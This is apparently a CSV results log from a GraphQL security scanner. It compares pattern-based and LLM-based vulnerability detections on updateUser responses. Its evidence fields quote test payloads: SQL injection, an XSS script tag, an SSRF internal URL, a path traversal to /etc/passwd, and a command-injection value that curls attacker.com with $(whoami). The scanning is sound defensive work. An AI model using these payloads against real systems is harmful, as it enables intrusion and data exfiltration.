timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-08T19:51:08.016574,updateUser_response_2,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]","[{""detection_name"": ""LLM: sql_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a SQL injection payload (' OR 1=1;--) in the firstName field. This payload attempts to manipulate database queries by terminating a string and injecting a tautology. While no SQL errors are visible in the response, the persistence of this payload in stored data suggests insufficient input sanitization. In GraphQL mutations, unsanitized user input passed to SQL queries could enable database manipulation."", ""evidence"": ""firstName: \""John' OR 1=1;--\"""", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""sql_injection"", ""severity"": ""HIGH"", ""confidence"": 0.8, ""evidence"": ""firstName: \""John' OR 1=1;--\"""", ""explanation"": ""The response contains a SQL injection payload (' OR 1=1;--) in the firstName field. This payload attempts to manipulate database queries by terminating a string and injecting a tautology. While no SQL errors are visible in the response, the persistence of this payload in stored data suggests insufficient input sanitization. In GraphQL mutations, unsanitized user input passed to SQL queries could enable database manipulation.""}}]"
2025-10-08T19:51:18.532805,updateUser_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response returns unsanitized user-controlled HTML content containing a script payload (<script>alert('xss')</script>). If this value is rendered directly in a browser without proper output encoding/sanitization, it would execute arbitrary JavaScript code in the victim's browser context. This meets criteria for stored/reflected XSS vulnerability in GraphQL responses when client-side rendering fails to sanitize the payload."", ""evidence"": ""The 'description' field contains <script>alert('xss')</script>"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""HIGH"", ""confidence"": 0.95, ""evidence"": ""The 'description' field contains <script>alert('xss')</script>"", ""explanation"": ""The response returns unsanitized user-controlled HTML content containing a script payload (<script>alert('xss')</script>). If this value is rendered directly in a browser without proper output encoding/sanitization, it would execute arbitrary JavaScript code in the victim's browser context. This meets criteria for stored/reflected XSS vulnerability in GraphQL responses when client-side rendering fails to sanitize the payload.""}}]"
2025-10-08T19:52:19.148107,updateUser_response_4,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Server-Side Request Forgery (SSRF) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SSRF injection vulnerability detected - internal network access patterns found"", ""evidence"": ""Response status: 200, SSRF keywords detected in response""}]","[{""detection_name"": ""LLM: ssrf_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a URL pointing to an internal service (internal-api.local), which is a common SSRF indicator. The presence of this URL in the description field suggests user-controlled input might directly influence internal network requests. While the response doesn't confirm a live request was made, the exposure of internal endpoints in this context strongly implies the application may process user-provided URLs unsafely."", ""evidence"": ""http://internal-api.local/status"", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""ssrf_injection"", ""severity"": ""HIGH"", ""confidence"": 0.8, ""evidence"": ""http://internal-api.local/status"", ""explanation"": ""The response contains a URL pointing to an internal service (internal-api.local), which is a common SSRF indicator. The presence of this URL in the description field suggests user-controlled input might directly influence internal network requests. While the response doesn't confirm a live request was made, the exposure of internal endpoints in this context strongly implies the application may process user-provided URLs unsafely.""}}]"
2025-10-08T19:52:29.108890,updateUser_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The payload in the 'lastName' field contains a semicolon (command separator) followed by a curl command with $(whoami) command substitution. This strongly suggests an attempt to execute arbitrary OS commands via improper input sanitization. The use of $(whoami) indicates shell command execution, and the curl request to an attacker-controlled domain confirms malicious intent."", ""evidence"": ""lastName: 'Injection; curl http://attacker.com/$(whoami);'"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""lastName: 'Injection; curl http://attacker.com/$(whoami);'"", ""explanation"": ""The payload in the 'lastName' field contains a semicolon (command separator) followed by a curl command with $(whoami) command substitution. This strongly suggests an attempt to execute arbitrary OS commands via improper input sanitization. The use of $(whoami) indicates shell command execution, and the curl request to an attacker-controlled domain confirms malicious intent.""}}]"
2025-10-08T19:52:39.570330,updateUser_response_6,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Path Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""Path injection vulnerability detected - file system access patterns found"", ""evidence"": ""Response status: 200, Path injection patterns detected in response""}]","[{""detection_name"": ""LLM: path_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a user-controlled input (description field) with the value '../../../../etc/passwd', which is a classic directory traversal payload targeting the Unix/Linux password file. This strongly suggests insufficient input validation/sanitization in file path handling. While the response doesn't explicitly show file contents, the acceptance of this payload in a field that might influence file operations (e.g., profile picture paths, file uploads, or resource loading) indicates a path injection vulnerability."", ""evidence"": ""description: \""../../../../etc/passwd\"""", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""path_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.9, ""evidence"": ""description: \""../../../../etc/passwd\"""", ""explanation"": ""The response contains a user-controlled input (description field) with the value '../../../../etc/passwd', which is a classic directory traversal payload targeting the Unix/Linux password file. This strongly suggests insufficient input validation/sanitization in file path handling. While the response doesn't explicitly show file contents, the acceptance of this payload in a field that might influence file operations (e.g., profile picture paths, file uploads, or resource loading) indicates a path injection vulnerability.""}}]"
2025-10-08T19:52:54.872112,updateUser_response_7,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,0,1,0,1.0,both_potential,Injection Attacks,,,"[{""detection_name"": ""HTML Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""HTML injection vulnerability detected - HTML markup found in response"", ""evidence"": ""Response status: 200, HTML patterns detected in response data""}]","[{""detection_name"": ""LLM: html_injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The response contains unsanitized HTML tags (<h1> and <blink>) in user-controlled fields (firstName/lastName). This indicates stored HTML injection vulnerability if these values are rendered directly in a web interface without proper escaping. While not directly executing scripts, this demonstrates markup manipulation capability and could enable content spoofing, defacement, or facilitate XSS if more dangerous tags are allowed."", ""evidence"": ""firstName: '<h1>Admin</h1>', lastName: '<blink>Privileged</blink>'"", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""MEDIUM"", ""confidence"": 0.9, ""evidence"": ""firstName: '<h1>Admin</h1>', lastName: '<blink>Privileged</blink>'"", ""explanation"": ""The response contains unsanitized HTML tags (<h1> and <blink>) in user-controlled fields (firstName/lastName). This indicates stored HTML injection vulnerability if these values are rendered directly in a web interface without proper escaping. While not directly executing scripts, this demonstrates markup manipulation capability and could enable content spoofing, defacement, or facilitate XSS if more dangerous tags are allowed.""}}]"
2025-10-08T19:53:09.775056,updateUser_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-08T19:53:26.901488,updateUser_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-08T19:54:17.762463,updateUser_response_10,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-08T19:54:33.766372,updateUser_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Unknown,1,0,0,0,1,0,0.0,llm_potential_only,,,Unknown,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: field_suggestions"", ""detection"": ""potential"", ""category"": ""Unknown"", ""description"": ""The GraphQL error response explicitly suggests valid field/argument names ('firstName', 'lastName') when invalid ones ('firstNam', 'firstname') are used. This constitutes an information disclosure vulnerability via field suggestions, as it reveals valid schema elements to unauthenticated clients. While not directly exploitable, this helps attackers probe the schema and refine malicious queries by revealing potential attack surface."", ""evidence"": ""Server responds with 'Did you mean \""firstName\"" or \""lastName\""?' suggestions for incorrect field/argument names"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""field_suggestions"", ""severity"": ""MEDIUM"", ""confidence"": 0.95, ""evidence"": ""Server responds with 'Did you mean \""firstName\"" or \""lastName\""?' suggestions for incorrect field/argument names"", ""explanation"": ""The GraphQL error response explicitly suggests valid field/argument names ('firstName', 'lastName') when invalid ones ('firstNam', 'firstname') are used. This constitutes an information disclosure vulnerability via field suggestions, as it reveals valid schema elements to unauthenticated clients. While not directly exploitable, this helps attackers probe the schema and refine malicious queries by revealing potential attack surface.""}}]"
